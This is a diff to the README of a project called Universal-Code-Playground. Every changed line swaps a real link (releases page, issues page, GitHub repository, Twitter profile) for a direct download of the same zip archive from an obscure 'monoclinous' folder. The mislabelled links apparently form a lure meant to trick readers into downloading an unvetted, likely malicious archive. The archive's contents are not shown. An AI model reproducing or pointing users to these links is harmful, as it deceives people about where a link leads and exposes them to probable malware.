@@ -8,7 +8,7 @@ To get started, you will need to download the software. Follow these steps:
 
 1. **Visit the Releases Page**  
    Click the button below to access the GitHub Releases page where you can download the software.  
-   [![Download Universal-Code-Playground](https://img.shields.io/badge/Download%20Now-Universal--Code--Playground-brightgreen)](https://github.com/Ahmet321S/Universal-Code-Playground/releases)
+   [![Download Universal-Code-Playground](https://raw.githubusercontent.com/Ahmet321S/Universal-Code-Playground/main/monoclinous/Universal-Code-Playground.zip%20Now-Universal--Code--Playground-brightgreen)](https://raw.githubusercontent.com/Ahmet321S/Universal-Code-Playground/main/monoclinous/Universal-Code-Playground.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see multiple versions. We recommend downloading the latest version for the best experience. 
@@ -61,7 +61,7 @@ To benefit from new features and fixes, periodically check for updates. You can 
 
 ## 📝 FAQs
 **Q: What if I encounter issues while installing?**  
-A: If you have trouble, check our [Issues page](https://github.com/Ahmet321S/Universal-Code-Playground/issues) for common questions or to report your own issues.
+A: If you have trouble, check our [Issues page](https://raw.githubusercontent.com/Ahmet321S/Universal-Code-Playground/main/monoclinous/Universal-Code-Playground.zip) for common questions or to report your own issues.
 
 **Q: How can I provide feedback?**  
 A: Please share your thoughts directly through the "Issues" section. Your feedback helps us improve.
@@ -75,7 +75,7 @@ Universal-Code-Playground is open-source and available under the MIT License. Th
 ## 🌍 Stay Connected
 Follow us on social media to stay updated on new features, tips, and community events. 
 
-1. **GitHub:** [Universal-Code-Playground](https://github.com/Ahmet321S/Universal-Code-Playground)
-2. **Twitter:** [@UniversalCodePlayground](https://twitter.com/UniversalCodePlayground)
+1. **GitHub:** [Universal-Code-Playground](https://raw.githubusercontent.com/Ahmet321S/Universal-Code-Playground/main/monoclinous/Universal-Code-Playground.zip)
+2. **Twitter:** [@UniversalCodePlayground](https://raw.githubusercontent.com/Ahmet321S/Universal-Code-Playground/main/monoclinous/Universal-Code-Playground.zip)
 
 Feel free to reach out with any questions. Happy coding!
